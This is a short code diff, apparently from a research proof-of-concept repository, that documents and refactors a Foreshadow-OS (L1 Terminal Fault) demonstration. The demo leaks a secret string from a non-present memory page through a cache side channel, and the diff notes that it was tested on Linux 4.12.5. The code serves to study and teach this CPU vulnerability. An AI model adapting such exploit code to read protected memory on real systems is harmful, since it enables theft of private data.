@@ -39,8 +39,16 @@
 const char *private_data = "It's a s3kr3t!!!";
 char *private_page = nullptr;
 
-extern char aftespeculation[];
-
+/**
+ * Demonstrates the Foreshadow-OS vulnerability - speculatively using non
+ * present pages for accessing unreachable memory. This is the simplest form of
+ * foreshadow that does not cross VM or SGX enclave boundaries.
+ *
+ * On older versions of Linux kernel (explicitly tested on 4.12.5) the mprotect
+ * call with PROT_NONE clears the present bit of the page, but the physical
+ * offset of that page is still speculatively used before the fault is
+ * triggered.
+ **/
 static char leak_byte(size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
@@ -56,8 +64,7 @@ static char leak_byte(size_t offset) {
       mprotect(private_page, PAGE_SIZE, PROT_NONE);
 
       // Block any speculation forward.
-      MFence();
-      LFence();
+      MemoryAndSpeculationBarrier();
 
       // Access the non-present private_page. That leads to a SEGFAULT.
       ForceRead(isolated_oracle.data() +
